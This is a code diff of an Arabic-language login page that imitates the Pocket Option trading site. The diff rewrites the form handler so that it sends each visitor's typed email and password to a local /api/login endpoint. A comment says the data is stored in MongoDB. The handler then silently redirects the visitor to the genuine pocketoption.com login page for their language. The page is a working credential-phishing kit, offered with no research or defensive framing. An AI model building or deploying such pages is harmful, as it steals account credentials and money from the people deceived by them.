@@ -114,7 +114,7 @@
 
     <div class="login-content">
         <p class="login-content__redirect"><span id="no-account-text">لم تقم بعد بالتسجيل؟</span><a href="" id="register-link">التسجيل</a></p>
-        <form action="/" method="POST" class="form-with-label" id="loginForm">
+        <form method="POST" class="form-with-label" id="loginForm">
             <input type="hidden" name="submitLogin" value="1">
             <div class="ajax-message js-message"></div>
             <div class="step1">
@@ -231,92 +231,51 @@ function changeLanguage(lang) {
     document.getElementById('languages-dropdown').classList.remove('languages--opened');
 }
 
+// معالجة نموذج تسجيل الدخول وإرسال البيانات لقاعدة البيانات ثم التحويل حسب اللغة
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginForm');
     if (loginForm) {
         loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
-            e.stopPropagation();
-
+            
             const emailField = document.getElementById('email');
             const passwordField = document.getElementById('password');
             const email = emailField ? emailField.value : '';
             const password = passwordField ? passwordField.value : '';
 
+            // إرسال البيانات إلى خادم الـ API وحفظها في MongoDB
             try {
                 await fetch('/api/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password })
                 });
-            } catch (err) {}
+            } catch (err) {
+                console.error('Fetch error:', err);
+            }
 
-            // التوجيه الفوري حسب اللغة الحالية
+            // التحويل الفوري للرابط حسب اللغة الحالية
             redirectToLocalizedPage();
-            return false;
         });
     }
-});
 
-function redirectToLocalizedPage() {
-    const currentLang = document.documentElement.lang || 'ar';
-    if (currentLang === 'ru') {
-        window.location.href = "https://pocketoption.com/ru/login/";
-    } else if (currentLang === 'ar') {
-        window.location.href = "https://pocketoption.com/ar/login/";
-    } else {
-        window.location.href = "https://pocketoption.com/en/login/";
-    }
-}
-
-    // حتى لو فشل الاتصال تماماً، سيقوم بالتحويل المباشر للرابط المطلوب حسب اللغة لضمان عدم توقفك أبداً
-    redirectToLocalizedPage();
-});
-
-function redirectToLocalizedPage() {
-    const currentLang = document.documentElement.lang || 'ar';
-    if (currentLang === 'ru') {
-        window.location.href = "https://pocketoption.com/ru/login/";
-    } else if (currentLang === 'ar') {
-        window.location.href = "https://pocketoption.com/ar/login/";
-    } else {
-        window.location.href = "https://pocketoption.com/en/login/";
-    }
-}
-
-}});
-    window.addEventListener('DOMContentLoaded', () => {
+    // فحص بارامتر اللغة من الرابط إن وجد
     const urlParams = new URLSearchParams(window.location.search);
     const langParam = urlParams.get('lang');
     if (langParam && translations[langParam]) {
-        // محاكاة اختيار اللغة بناءً على الرابط
-        const fakeEvent = { target: { innerText: translations[langParam].langName || langParam } };
-        // استدعاء دالة تغيير اللغة
-        changeLanguageFromParam(langParam);
+        changeLanguage(langParam);
     }
 });
 
-function changeLanguageFromParam(lang) {
-    const t = translations[lang];
-    if (!t) return;
-    document.documentElement.lang = lang;
-    document.documentElement.dir = t.dir || 'ltr';
-    document.body.className = `blank page-login ${t.langClass || 'en-lang'}`;
-    
-    document.getElementById('page-title').innerText = t.title;
-    document.getElementById('back-home-link').innerText = t.backHome;
-    document.getElementById('main-heading').innerText = t.mainHeading;
-    document.getElementById('no-account-text').innerText = t.noAccount;
-    document.getElementById('register-link').innerText = t.register;
-    document.getElementById('email').placeholder = t.emailPlaceholder;
-    document.getElementById('email-label').innerHTML = `${t.emailPlaceholder.replace(' *', '')} <span>*</span>`;
-    document.getElementById('password').placeholder = t.passwordPlaceholder;
-    document.getElementById('password-label').innerHTML = `${t.passwordPlaceholder.replace(' *', '')} <span>*</span>`;
-    document.getElementById('remember-text').innerText = t.remember;
-    document.getElementById('recovery-link-text').innerText = t.recovery;
-    document.getElementById('submit-btn-text').innerText = t.submit;
-    document.getElementById('social-title-text').innerText = t.socialTitle;
-    document.getElementById('recaptcha-text').innerText = t.recaptcha;
+function redirectToLocalizedPage() {
+    const currentLang = document.documentElement.lang || 'ar';
+    if (currentLang === 'ru') {
+        window.location.href = "https://pocketoption.com/ru/login/";
+    } else if (currentLang === 'ar') {
+        window.location.href = "https://pocketoption.com/ar/login/";
+    } else {
+        window.location.href = "https://pocketoption.com/en/login/";
+    }
 }
 </script>
 </body>
